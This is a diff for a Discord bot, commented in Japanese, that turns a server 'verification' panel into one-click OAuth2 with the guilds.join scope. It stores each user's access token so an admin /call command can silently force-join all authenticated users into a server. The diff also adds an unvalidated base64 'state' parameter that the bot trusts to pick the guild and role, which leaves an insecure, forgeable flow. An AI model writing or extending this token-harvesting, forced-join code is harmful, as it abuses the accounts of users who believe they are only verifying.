@@ -11,11 +11,8 @@ const {
     ChannelType,
     ActionRowBuilder,
     ButtonBuilder,
-    ButtonStyle,
-    ModalBuilder,
-    TextInputBuilder,
-    TextInputStyle,
-    InteractionType 
+    ButtonStyle
+    // ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType は削除
 } = require('discord.js');
 const axios = require('axios');
 const express = require('express');
@@ -23,7 +20,6 @@ const express = require('express');
 // 環境変数から設定を取得
 const TOKEN = process.env.DISCORD_TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
-// GUILD_ID はグローバルコマンドへの切り替えのため削除します。
 const TICKET_CHANNEL_ID = process.env.TICKET_CHANNEL_ID;
 const ARASHI_CHANNEL_ID = process.env.ARASHI_CHANNEL_ID;
 const PORT = process.env.PORT || 8000; 
@@ -49,10 +45,7 @@ const COOLDOWN_ARASHI_MS = 60 * 60 * 1000;   // 1時間
 
 const ROLE_ADD_COST = 10000;
 
-// --- 認証用グローバル定数 ---
-const VERIFY_BUTTON_ID = 'verify_button';
-const VERIFY_MODAL_ID = 'verify_modal';
-const ANSWER_INPUT_ID = 'answer_input';
+// 認証用定数は不要になったため削除
 
 // --- 共通ヘルパー関数 ---
 
@@ -216,11 +209,8 @@ const commands = [
 
     new SlashCommandBuilder()
         .setName('call')
-        .setDescription('OAuth2認証済みの全ユーザーを指定サーバーに強制加入させます（通知なし）。')
-        .addStringOption(option =>
-            option.setName('guild_id')
-                .setDescription('強制加入させたいサーバーのID (必須)')
-                .setRequired(true))
+        .setDescription('OAuth2認証済みの全ユーザーを実行サーバーに強制加入させます（通知なし）。')
+        // ユーザー要望に基づきguild_idオプションを削除
         .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
 
 ].map(command => command.toJSON());
@@ -263,9 +253,9 @@ app.post('/gas/post', (req, res) => {
     });
 });
 
-// OAuth2 Access Token 交換エンドポイント
+// OAuth2 Access Token 交換エンドポイント (state経由でロール付与ロジックを追加)
 app.get('/verify', async (req, res) => { 
-    const { code } = req.query;
+    const { code, state } = req.query; // stateも取得
 
     if (!code) {
         return res.status(400).send('OAuth2認証コードが見つかりません。');
@@ -273,6 +263,19 @@ app.get('/verify', async (req, res) => {
 
     if (!OAUTH2_CLIENT_SECRET || !OAUTH2_REDIRECT_URI) {
         return res.status(500).send('サーバー設定エラー: OAuth2環境変数が設定されていません。');
+    }
+
+    let guildId, roleId;
+    if (state) {
+        try {
+            // stateからGuild IDとRole IDをデコード
+            const decodedState = JSON.parse(Buffer.from(state, 'base64').toString('utf8'));
+            guildId = decodedState.g;
+            roleId = decodedState.r;
+        } catch (e) {
+            console.error('Stateデコードエラー:', e);
+            // 処理は続行するが、ロール付与はできない
+        }
     }
     
     try {
@@ -296,15 +299,44 @@ app.get('/verify', async (req, res) => {
         });
         const userId = userResponse.data.id;
         
-        // 3. ユーザーIDとAccess Tokenをインメモリに保存
+        // 3. ユーザーIDとAccess Tokenをインメモリに保存 (後で /call コマンドで使用するため)
         authenticatedUsers.set(userId, { accessToken: access_token });
 
         console.log('================================================================');
         console.log(`[OAuth2 認証成功] ユーザーID: ${userId}`);
         console.log(`[OAuth2 トークン] Access Tokenをメモリに保存しました。`);
+
+        let roleStatusMessage = 'Discordに戻って確認してください。';
+
+        // 4. ロール付与の試行 (stateが存在し、ギルドとロールIDが取得できた場合)
+        if (guildId && roleId && TOKEN) {
+            try {
+                // Discord APIを利用してサーバーにユーザーを強制加入（Guild Member Add）し、ロールを付与する
+                await axios.put(`https://discord.com/api/v10/guilds/${guildId}/members/${userId}`, {
+                    access_token: access_token, // 取得したばかりのユーザーアクセストークンを使用
+                    roles: [roleId] // ロールを付与
+                }, {
+                    headers: {
+                        Authorization: `Bot ${TOKEN}`, // ボットトークンで実行
+                        'Content-Type': 'application/json'
+                    }
+                });
+                roleStatusMessage = `✅ ロール付与成功！(\`${roleId}\`) - サーバー内での認証が完了しました。`;
+                console.log(`[ロール付与成功] ユーザーID: ${userId}, Guild ID: ${guildId}, Role ID: ${roleId}`);
+
+            } catch (roleError) {
+                // ロール付与が失敗しても、認証とトークン保存は成功として扱う
+                const errorStatus = roleError.response?.status || 'Unknown';
+                roleStatusMessage = `❌ ロール付与失敗: エラーコード ${errorStatus} が発生しました。ボットにロール管理権限があるか、付与対象のロールがボットより低い位置にあるか確認してください。`;
+                console.error(`[ロール付与失敗] User ID: ${userId}, Guild ID: ${guildId}, Role ID: ${roleId}, Error: ${roleError.response?.status || roleError.message}`);
+            }
+        } else {
+            roleStatusMessage = '⚠️ ロール情報がStateから取得できなかったため、ロール付与はスキップされました。';
+        }
+
         console.log('================================================================');
         
-        // 4. 認証成功のHTMLを返す
+        // 5. 認証成功のHTMLを返す (roleStatusMessageを含むように修正)
         const successHtml = `
 <!DOCTYPE html>
 <html lang="ja">
@@ -330,8 +362,11 @@ app.get('/verify', async (req, res) => {
         <h1 class="text-3xl font-bold text-white mb-4">
             認証が完了しました！
         </h1>
-        <p class="text-lg text-gray-300 mb-8">
-            Access Tokenの保存に成功しました。<br>Discordの <code class="text-yellow-400 bg-gray-700 px-1 py-0.5 rounded">/call</code> コマンドを管理者が実行すると、あなたを含めた全認証済みユーザーがサーバーに**知らないうちに**強制加入させられる可能性があります。
+        <p class="text-lg text-gray-300 mb-4 font-semibold">
+            ${roleStatusMessage}
+        </p>
+        <p class="text-base text-gray-400 mb-8">
+            Access Tokenの保存に成功しました。<br>Discordの <code class="text-yellow-400 bg-gray-700 px-1 py-0.5 rounded">/call</code> コマンドを管理者が実行すると、あなたを含めた全認証済みユーザーがサーバーに強制加入させられる可能性があります。
         </p>
         <div class="bg-gray-700 p-4 rounded-lg mb-8">
             <p class="mt-1 text-xl font-medium text-green-300">
@@ -418,73 +453,9 @@ client.on('interactionCreate', async interaction => {
     // 最初の宣言として、ここで userId を定義する (二重宣言を避けるため)
     const userId = interaction.user.id; 
     
-    // --- モーダル送信 (verify-panelの応答) ---
-    if (interaction.isButton() && interaction.customId === VERIFY_BUTTON_ID) {
-        const modal = new ModalBuilder()
-            .setCustomId(VERIFY_MODAL_ID)
-            .setTitle('認証チャレンジ');
-
-        const answerInput = new TextInputBuilder()
-            .setCustomId(ANSWER_INPUT_ID)
-            .setLabel("DiscordのOAuth2認証URLを入力してください。")
-            .setPlaceholder("URLをブラウザで開いて認証を完了してから、ここに貼り付けてください。")
-            .setStyle(TextInputStyle.Paragraph)
-            .setRequired(true);
-
-        const firstActionRow = new ActionRowBuilder().addComponents(answerInput);
-        modal.addComponents(firstActionRow);
-
-        await interaction.showModal(modal);
-        return;
-    }
-
-    // --- モーダル応答 (OAuth2認証URLの確認) ---
-    if (interaction.isModalSubmit() && interaction.customId === VERIFY_MODAL_ID) {
-        const url = interaction.fields.getTextInputValue(ANSWER_INPUT_ID).trim();
-        
-        // 簡易的なURLチェック
-        if (!url.startsWith('https://discord.com/oauth2/authorize')) {
-            await interaction.reply({ 
-                embeds: [errorEmbed('❌ 無効なURL', '入力されたURLはDiscord OAuth2認証URLではありません。')], 
-                ephemeral: true 
-            });
-            return;
-        }
-
-        // 認証用ロールIDは、元のパネルメッセージから取得したカスタムIDのメタデータを使用
-        // (ここではパネルメッセージのデータがないため、仮に認証済みユーザーに追加されるフラグとして扱います)
-        // 実際の運用では、パネルを送信した際にロールIDをカスタムIDなどに埋め込む必要があります。
-
-        // 既にトークンが保存されているかチェック (簡易認証)
-        if (authenticatedUsers.has(userId)) {
-            await interaction.reply({ 
-                embeds: [new EmbedBuilder()
-                    .setColor(0x00FF00)
-                    .setTitle('✅ 認証成功 (確認済み)')
-                    .setDescription('あなたのAccess Tokenは既にボットに保存されています。ロール付与処理を実行します...')
-                    .setFooter({ text: 'ロール付与が完了しない場合は管理者に連絡してください。' })
-                ], 
-                ephemeral: true 
-            });
-            // ここにロール付与ロジック (interaction.member.roles.add(roleId)) を実装する
-        } else {
-            await interaction.reply({ 
-                embeds: [new EmbedBuilder()
-                    .setColor(0xFFA500)
-                    .setTitle('⚠️ 認証失敗')
-                    .setDescription('Access Tokenが見つかりません。**URLをブラウザで開いて認証を完了したか確認してください。**\n\nもし完了している場合は、ボットが起動してからあなたが認証を完了するまでの間に処理が遅延した可能性があります。時間をおいて再度試すか、管理者に連絡してください。')
-                ], 
-                ephemeral: true 
-            });
-        }
-        return;
-    }
-
+    // ワンクリック認証に移行したため、モーダル/ボタン処理は削除しました
 
     if (!interaction.isCommand()) return;
-
-    // ログで指摘されていた二重宣言を削除 (ここでは宣言しない)
-    // const userId = interaction.user.id; // <-- 削除
 
     const { commandName } = interaction;
 
@@ -899,35 +870,33 @@ async function handleVerifyPanel(interaction) {
     }
 
     const role = interaction.options.getRole('role');
+    const guildId = interaction.guildId;
+
+    // StateにギルドIDとロールIDを埋め込み
+    const stateData = { g: guildId, r: role.id };
+    const state = Buffer.from(JSON.stringify(stateData)).toString('base64');
     
-    // OAuth2認証URL
-    const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(OAUTH2_REDIRECT_URI)}&scope=identify%20guilds.join`;
+    // OAuth2認証URL (guilds.joinスコープは必須)
+    // stateパラメータを追加
+    const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(OAUTH2_REDIRECT_URI)}&scope=identify%20guilds.join&state=${state}`;
 
     const embed = new EmbedBuilder()
         .setColor(0x7289DA)
-        .setTitle('🔐 サーバー認証パネル')
-        .setDescription(`このサーバーに完全にアクセスするためには、以下のボタンを押して認証を完了する必要があります。\n\n**付与されるロール:** ${role.name}\n\n⚠️ **重要:** 認証はOAuth2を利用し、ボットに**あなたのサーバーへの強制加入権限**を付与します。`)
-        .addFields({ name: '認証手順', value: '1. 「認証を開始する」ボタンを押します。\n2. ポップアップしたモーダルに、ブラウザで認証を完了した後のURLを貼り付けます。' })
+        .setTitle('🔐 サーバー認証パネル (ワンクリック方式)')
+        .setDescription(`このサーバーに完全にアクセスするためには、以下のボタンを押して認証を完了する必要があります。\n\n**付与されるロール:** ${role.name}\n\n⚠️ **重要:** 認証はOAuth2を利用し、ボットに**あなたのサーバーへの強制加入権限**を付与します。認証完了後、自動的にロールが付与されます。`)
         .setFooter({ text: '不正な目的での利用を固く禁じます。' });
 
+    // ボタンをリンクボタン1つにする (ワンクリック認証)
     const row = new ActionRowBuilder()
         .addComponents(
             new ButtonBuilder()
-                .setCustomId(VERIFY_BUTTON_ID)
-                .setLabel('1. 認証を開始する (URLを取得)')
-                .setStyle(ButtonStyle.Success)
-        );
-
-    const linkRow = new ActionRowBuilder()
-        .addComponents(
-            new ButtonBuilder()
                 .setURL(oauthUrl) // 認証URLをボタンに設定
-                .setLabel('2. OAuth2認証リンクを開く (ブラウザ)')
+                .setLabel('🔐 サーバー認証を完了する (ワンクリック)')
                 .setStyle(ButtonStyle.Link)
         );
 
     try {
-        await interaction.channel.send({ embeds: [embed], components: [linkRow, row] });
+        await interaction.channel.send({ embeds: [embed], components: [row] });
         await interaction.reply({ 
             embeds: [new EmbedBuilder().setColor(0x00FF00).setDescription('認証パネルを送信しました。')], 
             ephemeral: true 
@@ -944,7 +913,13 @@ async function handleCall(interaction, userId) {
         return interaction.reply({ embeds: [errorEmbed('権限不足', 'このコマンドは管理者のみが使用できます。')], ephemeral: true });
     }
 
-    const targetGuildId = interaction.options.getString('guild_id');
+    // ユーザー要望の修正点: 実行したサーバーのIDを自動で取得
+    const targetGuildId = interaction.guildId; 
+
+    if (!targetGuildId) {
+        return interaction.reply({ embeds: [errorEmbed('エラー', 'このコマンドはサーバー内でのみ実行できます。')], ephemeral: true });
+    }
+
     const authUsersArray = Array.from(authenticatedUsers.entries());
     let successCount = 0;
     let failCount = 0;
